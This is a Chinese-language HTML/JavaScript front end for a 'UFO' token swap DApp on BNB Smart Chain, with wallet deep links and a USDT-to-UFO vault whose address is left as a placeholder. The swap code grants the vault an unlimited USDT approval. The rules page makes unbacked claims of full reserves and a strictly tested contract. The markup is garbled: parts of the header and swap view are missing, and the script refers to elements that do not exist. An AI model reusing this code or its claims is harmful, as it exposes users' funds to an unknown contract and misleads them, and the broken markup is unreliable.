<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>UFO 生态</title>
    <style>
        /* ================= 全局重置与尺寸缩小 ================= */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
        html, body { width: 100vw; height: 100dvh; overflow: hidden; background-color: #f8fafc; font-size: 14px; }
        .app-container { width: 100vw; height: 100dvh; display: flex; flex-direction: column; position: relative; overflow: hidden; background-color: #f8fafc; }
        
        .glow { position: absolute; border-radius: 50%; filter: blur(80px); z-index: 0; pointer-events: none; }
        .glow-1 { top: -50px; left: -50px; width: 250px; height: 250px; background: #bfdbfe; opacity: 0.4; }
        .glow-2 { bottom: 50px; right: -50px; width: 250px; height: 250px; background: #ddd6fe; opacity: 0.4; }

        /* Header 极度紧凑 */
        .header { display: flex; justify-content: space-between; align-items: center; padding: 16px 20px; z-index: 10; flex-shrink: 0; }
        .logo-row { display: flex; align-items: center; gap: 8px; }
        .logo-icon { width: 32px; height: 32px; background: #fff; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 2px 8px rgba(0,0,0,0.06); }
        .title { font-size: 18px; font-weight: 800; color: #1e293b; letter-spacing: -0.5px; }
        .title-blue { color: #3b82f6; }
        .connect-btn { background: #3b82f6; color: #fff; border: none; padding: 8px 16px; border-radius: 99px; font-weight: 600; cursor: pointer; font-size: 13px; box-shadow: 0 4px 12px rgba(59,130,246,0.3); }
        .wallet-info { background: #fff; padding: 6px 12px; border-radius: 99px; font-size: 12px; border: 1px solid #e2e8f0; display: none; align-items: center; gap: 6px; font-family: monospace; font-weight: 700; color: #1e293b; }
        .dot { width: 6px; height: 6px; border-radius: 50%; background: #10b981; }

        /* 内容区 */
        .page-container { flex: 1; z-index: 10; overflow-y: auto; }
        .page-view { display: none; padding: 10px 20px 30px 20px; height: 100%; }
        .page-view.active { display: flex; flex-direction: column; }

        /* 兑换面板 紧凑化 */
        .panel { background: #ffffff; border-radius: 24px; padding: 20px; box-shadow: 0 10px 30px -10px rgba(0,0,0,0.06); margin-top: 10px; border: 1px solid #f1f5f9;}
        .panel-title { font-size: 16px; font-weight: 800; color: #1e293b; margin-bottom: 16px; text-align: center; }
        .input-box { background: #f8fafc; border-radius: 16px; padding: 16px; border: 1px solid #e2e8f0; margin-bottom: 4px; }
        .input-row { display: flex; justify-content: space-between; font-size: 12px; color: #64748b; margin-bottom: 6px; font-weight: 600; }
        .input-field { background: transparent; font-size: 28px; font-weight: 800; color: #1e293b; border: none; outline: none; width: 100%; }
        
        .token-pill { display: flex; align-items: center; gap: 6px; background: #ffffff; padding: 6px 12px; border-radius: 99px; border: 1px solid #e2e8f0; font-weight: 700; font-size: 14px; box-shadow: 0 2px 6px rgba(0,0,0,0.02);}
        .token-icon { width: 22px; height: 22px; object-fit: contain; }

        .switch-container { display: flex; justify-content: center; margin: -18px 0; position: relative; z-index: 10; }
        .switch-btn { background: #ffffff; border: 4px solid #f8fafc; width: 44px; height: 44px; border-radius: 50%; box-shadow: 0 4px 12px rgba(59,130,246,0.1); color: #3b82f6; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        
        .rate-display { text-align: center; font-size: 13px; color: #64748b; margin-top: 20px; font-weight: 600; background: #f8fafc; border-radius: 10px; padding: 10px; }
        .rate-display span { color: #3b82f6; font-weight: 800; font-size: 14px; }
        .fee-notice { font-size: 11px; color: #ef4444; text-align: center; margin-top: 8px; font-weight: 500;}

        .action-btn { width: 100%; padding: 16px; border-radius: 16px; font-size: 16px; font-weight: 800; background: #3b82f6; color: #ffffff; border: none; cursor: pointer; margin-top: 20px; box-shadow: 0 8px 20px -5px rgba(59,130,246,0.4); }
        .msg-text { margin-top: 12px; text-align: center; font-size: 13px; color: #ef4444; background: #fef2f2; padding: 8px; border-radius: 8px; display: none; font-weight: 600;}

        /* 资产面板紧凑化 */
        .balance-card { background: #ffffff; border-radius: 24px; padding: 20px; box-shadow: 0 10px 30px -10px rgba(0,0,0,0.06); display: flex; flex-direction: column; gap: 16px; margin-top: 10px; border: 1px solid #f1f5f9;}
        .balance-item { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f1f5f9; padding-bottom: 12px;}
        .balance-item:last-child { border-bottom: none; padding-bottom: 0;}
        .balance-left { display: flex; align-items: center; gap: 10px;}
        .balance-logo { width: 36px; height: 36px; background: #f8fafc; border-radius: 50%; display: flex; justify-content: center; align-items: center;}
        .balance-logo img, .balance-logo svg { width: 20px; height: 20px; object-fit: contain;}
        .balance-name { font-size: 14px; font-weight: 700; color: #1e293b;}
        .balance-val { font-size: 18px; font-weight: 800; color: #1e293b; }

        /* 规则面板紧凑化 */
        .rules-content { padding-top: 10px; color: #1e293b; padding-bottom: 40px;}
        .rules-section { margin-bottom: 16px; background: #ffffff; padding: 20px; border-radius: 20px; border: 1px solid #f1f5f9;}
        .rules-title { font-size: 15px; font-weight: 800; margin-bottom: 10px; }
        .rules-text { font-size: 13px; color: #475569; line-height: 1.6; }

        /* 底部导航 紧凑化 */
        .tab-bar { display: flex; justify-content: space-around; align-items: center; background: #ffffff; border-top: 1px solid #f1f5f9; padding: 10px 0 20px 0; z-index: 20; flex-shrink: 0;}
        .tab-item { display: flex; flex-direction: column; align-items: center; gap: 4px; color: #94a3b8; font-size: 11px; font-weight: 600; cursor: pointer;}
        .tab-item.active { color: #3b82f6; }
        .tab-icon { width: 20px; height: 20px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round;}

        /* 钱包选择弹窗（全量图标 + 紧凑） */
        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(15,23,42,0.4); backdrop-filter: blur(4px); display: none; justify-content: center; align-items: flex-end; z-index: 999; padding: 16px; }
        .modal-content { background: #ffffff; border-radius: 20px; width: 100%; max-width: 340px; padding: 16px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); margin-bottom: 10px; animation: slideUp 0.2s ease-out; }
        @keyframes slideUp { from { transform: translateY(30px); opacity: 0;} to { transform: translateY(0); opacity: 1;} }
        
        .wallet-item { display: flex; align-items: center; gap: 12px; padding: 10px 12px; border-radius: 12px; background: #f8fafc; border: 1px solid transparent; width: 100%; margin-bottom: 8px; cursor: pointer; transition: 0.1s;}
        .wallet-item:active { background: #f1f5f9; border-color: #e2e8f0; }
        .wallet-icon { width: 32px; height: 32px; border-radius: 50%; background: #fff; padding: 2px; object-fit: contain; }
        .wallet-name { font-weight: 700; font-size: 14px; color: #1e293b; }
        .wallet-desc { font-size: 11px; color: #94a3b8; margin-top: 2px; }
        .close-modal { width: 100%; padding: 12px; border-radius: 12px; border: none; background: #f1f5f9; color: #475569; font-weight: 700; font-size: 14px; cursor: pointer; margin-top: 4px;}

        @media (min-width: 768px) {
            body { background-color: #0f172a; display: flex; justify-content: center; align-items: center; }
            .app-container { width: 375px; height: 812px; border-radius: 40px; box-shadow: 0 0 0 8px #1e293b, 0 20px 50px rgba(0,0,0,0.5); border: 1px solid #334155; }
        }
    </style>
</head>
<body>

    <div class="app-container">
        <div class="glow glow-1"></div>
        <div class="glow glow-2"></div>

        <div class="header">
            <div class="logo-row">
                <!-- 纯几何 UFO（无渐变，极简线条） -->
                <div class="logo-icon">
                    <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="50" cy="40" r="15" fill="#3b82f6" opacity="0.8"/>
                        <ellipse cx="50" cy="55" rx="40" ry="12" fill="#1e293b" />
                        <circle cx="30" cy="55" r="3" fill="#fff" />

            <div id="walletInfo" class="wallet-info">

        <div class="page-container">

                    <div class="panel-title">闪兑</div>
                    <div class="input-box">

                            <input type="number" id="inputAmount" class="input-field" placeholder="0.0" oninput="calculateOutput()">
                            <div id="pillPay" class="token-pill">

                    </div>

                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M7 10l5-5 5 5"/><path d="M7 14l5 5 5-5"/></svg>
                        </button>
                    </div>
                    <div class="input-box" style="margin-top: 4px;">
                        <div class="input-row"><span>您收到</span></div>
                        <div style="display: flex; justify-content: space-between; align-items: center; gap: 12px;">
                            <div class="input-field" style="color: #94a3b8;" id="outputAmount">0.0</div>
                            <div id="pillReceive" class="token-pill">
                                <!-- 小几何 UFO -->
                                <svg viewBox="0 0 100 100" class="token-icon" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="40" r="15" fill="#3b82f6" opacity="0.8"/><ellipse cx="50" cy="55" rx="40" ry="12" fill="#1e293b" /><circle cx="30" cy="55" r="3" fill="#fff" /><circle cx="50" cy="57" r="3" fill="#fff" /><circle cx="70" cy="55" r="3" fill="#fff" /></svg>
                                <span>UFO</span>
                            </div>
                        </div>
                    </div>
                    <div class="rate-display">实时汇率: 1 UFO ≈ <span id="rateValue">10.0</span> USDT</div>
                    <div class="fee-notice">* 双向兑换收取 0.5% 手续费</div>
                    <button id="actionBtn" class="action-btn" onclick="handleAction()">连接钱包</button>
                    <div id="msgBox" class="msg-text"></div>
                </div>
            </div>

            <!-- 2. 资产页面 -->
            <div id="view-assets" class="page-view">
                <div class="balance-card">
                    <div class="balance-item">
                        <div class="balance-left">
                            <div class="balance-logo"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png"></div>
                            <div class="balance-name">USDT</div>
                        </div>
                        <div class="balance-val"><span id="usdtBalance">0.0</span></div>
                    </div>
                    <div class="balance-item">
                        <div class="balance-left">
                            <div class="balance-logo"><svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="40" r="15" fill="#3b82f6" opacity="0.8"/><ellipse cx="50" cy="55" rx="40" ry="12" fill="#1e293b" /><circle cx="30" cy="55" r="3" fill="#fff" /><circle cx="50" cy="57" r="3" fill="#fff" /><circle cx="70" cy="55" r="3" fill="#fff" /></svg></div>
                            <div class="balance-name">UFO</div>
                        </div>
                        <div class="balance-val"><span id="ufoBalance">0.0</span></div>
                    </div>
                </div>
            </div>

            <!-- 3. 规则页面 -->
            <div id="view-rules" class="page-view">
                <div class="rules-content">
                    <div class="rules-section">
                        <div class="rules-title">🌐 UFO 应用场景</div>
                        <div class="rules-text">UFO 是一种基于 BSC 链发行的去中心化稳定资产，专为高频跨境支付与商业结算设计。</div>
                    </div>
                    <div class="rules-section">
                        <div class="rules-title">🛡️ 安全承诺</div>
                        <div class="rules-text">100% 资金储备、透明金库（资金流向可链上审计）、合约已通过严格测试。</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- 底部导航栏（全几何线条图标） -->
        <div class="tab-bar">
            <div id="tab-swap" class="tab-item active" onclick="switchTab('swap')">
                <svg class="tab-icon" viewBox="0 0 24 24"><path d="M8 3L4 7l4 4"/><path d="M4 7h16"/><path d="M16 21l4-4-4-4"/><path d="M20 17H4"/></svg>
                <span>兑换</span>
            </div>
            <div id="tab-assets" class="tab-item" onclick="switchTab('assets')">
                <svg class="tab-icon" viewBox="0 0 24 24"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>
                <span>资产</span>
            </div>
            <div id="tab-rules" class="tab-item" onclick="switchTab('rules')">
                <svg class="tab-icon" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
                <span>规则</span>
            </div>
        </div>
    </div>

    <!-- 手机端全量钱包选择弹窗 -->
    <div id="walletModal" class="modal-overlay" onclick="closeModal(event)">
        <div class="modal-content" onclick="event.stopPropagation()">
            <h3 style="margin-bottom: 16px; font-size: 16px; font-weight: 800; color: #1e293b;">选择钱包</h3>
            <div id="walletList" style="max-height: 50vh; overflow-y: auto; padding-right: 4px;">
                <!-- 图标全部换为 CoinMarketCap 高清无损，尺寸 32px -->
                <button class="wallet-item" onclick="openDeepLink('metamask')">
                    <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/11419.png" class="wallet-icon">
                    <div><div class="wallet-name">MetaMask</div><div class="wallet-desc">全球最广泛使用</div></div>
                </button>
                <button class="wallet-item" onclick="openDeepLink('trust')">
                    <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/3717.png" class="wallet-icon">
                    <div><div class="wallet-name">Trust Wallet</div><div class="wallet-desc">官方多链钱包</div></div>
                </button>
                <button class="wallet-item" onclick="openDeepLink('phantom')">
                    <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/21795.png" class="wallet-icon">
                    <div><div class="wallet-name">Phantom</div><div class="wallet-desc">多链极简钱包</div></div>
                </button>
                <button class="wallet-item" onclick="openDeepLink('okx')">
                    <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/24476.png" class="wallet-icon">
                    <div><div class="wallet-name">OKX Web3</div><div class="wallet-desc">欧易钱包</div></div>
                </button>
                <button class="wallet-item" onclick="openDeepLink('binance')">
                    <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png" class="wallet-icon">
                    <div><div class="wallet-name">Binance Wallet</div><div class="wallet-desc">币安官方 Web3 钱包</div></div>
                </button>
                <button class="wallet-item" onclick="openDeepLink('tokenpocket')">
                    <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/4380.png" class="wallet-icon">
                    <div><div class="wallet-name">TokenPocket</div><div class="wallet-desc">华人圈最常用</div></div>
                </button>
                <button class="wallet-item" onclick="openDeepLink('safepal')">
                    <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/5864.png" class="wallet-icon">
                    <div><div class="wallet-name">SafePal</div><div class="wallet-desc">币安投资</div></div>
                </button>
                <button class="wallet-item" onclick="openDeepLink('rainbow')">
                    <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/20755.png" class="wallet-icon">
                    <div><div class="wallet-name">Rainbow</div><div class="wallet-desc">以太坊绚丽钱包</div></div>
                </button>
            </div>
            <button class="close-modal" onclick="closeModal(event)">取消</button>

    </div>

    <!-- Ethers (更换为更稳定的 jsdelivr) -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>

    <!-- 核心逻辑 -->
    <script>
        const VAULT_ADDRESS = '0x你的BSC金库地址'; 
        const UFO_ADDRESS = '0x你的BSC_UFO地址';
        const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
        const rpcProvider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");

        const ERC20_ABI = ["function allowance(address, address) view returns (uint256)", "function approve(address, uint256) returns (bool)", "function balanceOf(address) view returns (uint256)"];
        const VAULT_ABI = ["function deposit(uint256)", "function withdraw(uint256)", "function getExchangeRate() view returns (uint256)"];

        let currentAddress = null;
        let currentSigner = null;
        let isBuyingUFO = true;
        let currentNav = 10;
        const FEE_RATE = 0.005;

        window.switchTab = (tab) => {
            document.querySelectorAll('.page-view').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-item').forEach(el => el.classList.remove('active'));
            document.getElementById(`view-${tab}`).classList.add('active');
            document.getElementById(`tab-${tab}`).classList.add('active');
        };

        window.toggleMode = () => {
            isBuyingUFO = !isBuyingUFO;
            // 极简几何 SVG 代码
            const ufoSvg = `<svg viewBox="0 0 100 100" class="token-icon" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="40" r="15" fill="#3b82f6" opacity="0.8"/><ellipse cx="50" cy="55" rx="40" ry="12" fill="#1e293b" /><circle cx="30" cy="55" r="3" fill="#fff" /><circle cx="50" cy="57" r="3" fill="#fff" /><circle cx="70" cy="55" r="3" fill="#fff" /></svg>`;
            const usdtSvg = `<img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" class="token-icon">`;

            if (isBuyingUFO) {
                document.getElementById('pillPay').innerHTML = `${usdtSvg}<span>USDT</span>`;
                document.getElementById('pillReceive').innerHTML = `${ufoSvg}<span>UFO</span>`;
                if(currentAddress) document.getElementById('actionBtn').innerText = "立即兑换";
            } else {
                document.getElementById('pillPay').innerHTML = `${ufoSvg}<span>UFO</span>`;
                document.getElementById('pillReceive').innerHTML = `${usdtSvg}<span>USDT</span>`;
                if(currentAddress) document.getElementById('actionBtn').innerText = "立即赎回";
            }
            document.getElementById('inputAmount').value = '';
            document.getElementById('outputAmount').innerText = '0.0';
        };

        window.calculateOutput = () => {
            const input = parseFloat(document.getElementById('inputAmount').value);
            if (isNaN(input) || input <= 0) return document.getElementById('outputAmount').innerText = '0.0';
            let output = isBuyingUFO ? (input * (1 - FEE_RATE)) / (currentNav || 1) : (input * (currentNav || 1)) * (1 - FEE_RATE);
            document.getElementById('outputAmount').innerText = output.toFixed(4).replace(/\.?0+$/, '');
        };

        const formatAmount = (val) => {
            if (!val) return '0.0';
            const num = parseFloat(val);
            return num === 0 ? '0.0' : num.toFixed(4).replace(/\.?0+$/, '');
        };

        window.showMsg = (text) => {
            const el = document.getElementById('msgBox');
            if (!text) el.style.display = 'none'; 
            else { el.innerText = text; el.style.display = 'block'; }
        };

        window.connectWallet = async () => {
            if (window.ethereum) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }],
                    }).catch(async (err) => {
                        if (err.code === 4902) {
                            await window.ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [{ chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org/'], blockExplorerUrls: ['https://bscscan.com/'] }],
                            });
                        }
                    });

                    const provider = new ethers.BrowserProvider(window.ethereum);
                    const accounts = await provider.send("eth_requestAccounts", []);
                    currentSigner = await provider.getSigner();
                    currentAddress = accounts[0];

                    document.getElementById('connectBtn').style.display = 'none';
                    document.getElementById('walletInfo').style.display = 'flex';
                    document.getElementById('walletAddress').innerText = `${currentAddress.slice(0,4)}...${currentAddress.slice(-4)}`;
                    document.getElementById('actionBtn').innerText = isBuyingUFO ? "立即兑换" : "立即赎回";
                    fetchBalances();
                } catch (err) {
                    alert("连接被拒绝或失败");
                }
            } else {
                document.getElementById('walletModal').style.display = 'flex';
            }
        };

        window.closeModal = (e) => {
            if (e) e.stopPropagation();
            document.getElementById('walletModal').style.display = 'none';
        };

        // 8大钱包 Deep Link
        window.openDeepLink = (wallet) => {
            const url = window.location.href;
            if (wallet === 'metamask') window.location.href = "https://metamask.app.link/dapp/" + encodeURIComponent(url);
            else if (wallet === 'trust') window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(url);
            else if (wallet === 'phantom') window.location.href = "https://phantom.app/ul/browse/" + encodeURIComponent(url);
            else if (wallet === 'okx') window.location.href = "okx://wallet/dapp/details?dappUrl=" + encodeURIComponent(url);
            else if (wallet === 'tokenpocket') window.location.href = "tpdapp://open?params={\"url\":\"" + encodeURIComponent(url) + "\"}";
            else if (wallet === 'binance') window.location.href = "https://app.binance.com/en/download";
            else alert("请复制当前网页地址，在 " + wallet + " 的 DApp 浏览器中粘贴打开。");
        };

        const fetchBalances = async () => {
            if (!currentAddress) return;
            try {
                const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, rpcProvider);
                const ufo = new ethers.Contract(UFO_ADDRESS, ERC20_ABI, rpcProvider);
                document.getElementById('usdtBalance').innerText = formatAmount(ethers.formatUnits(await usdt.balanceOf(currentAddress), 6));
                document.getElementById('ufoBalance').innerText = formatAmount(ethers.formatUnits(await ufo.balanceOf(currentAddress), 18));
            } catch (e) {}
        };

        window.handleAction = async () => {
            if (!currentAddress || !currentSigner) return connectWallet();
            const amount = document.getElementById('inputAmount').value;
            if (!amount || Number(amount) <= 0) return showMsg("请输入有效金额");
            
            const btn = document.getElementById('actionBtn');
            btn.disabled = true; btn.innerText = "处理中..."; showMsg('');

            try {
                const vault = new ethers.Contract(VAULT_ADDRESS, VAULT_ABI, currentSigner);
                if (isBuyingUFO) {
                    const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, currentSigner);
                    const rawAmount = ethers.parseUnits(amount, 6);
                    if (await usdt.allowance(currentAddress, VAULT_ADDRESS) < rawAmount) {
                        showMsg("正在授权 USDT...");
                        await (await usdt.approve(VAULT_ADDRESS, ethers.MaxUint256)).wait();
                    }
                    showMsg("正在兑换 UFO...");
                    await (await vault.deposit(rawAmount)).wait();
                    showMsg("兑换成功！");
                } else {
                    showMsg("正在赎回 USDT...");
                    await (await vault.withdraw(ethers.parseUnits(amount, 18))).wait();
                    showMsg("赎回成功！");
                }
                document.getElementById('inputAmount').value = '';
                document.getElementById('outputAmount').innerText = '0.0';
                fetchBalances();
            } catch (err) {
                showMsg("交易失败或被取消");
            } finally {
                btn.disabled = false; btn.innerText = "立即操作";
            }
        };

        window.addEventListener('load', async () => {
            try {
                const vault = new ethers.Contract(VAULT_ADDRESS, VAULT_ABI, rpcProvider);
                currentNav = parseFloat(ethers.formatUnits(await vault.getExchangeRate(), 18));
                document.getElementById('rateValue').innerText = formatAmount(currentNav);
            } catch (e) {
                document.getElementById('rateValue').innerText = "10.0";
            }
        });
    </script>
</body>
</html>
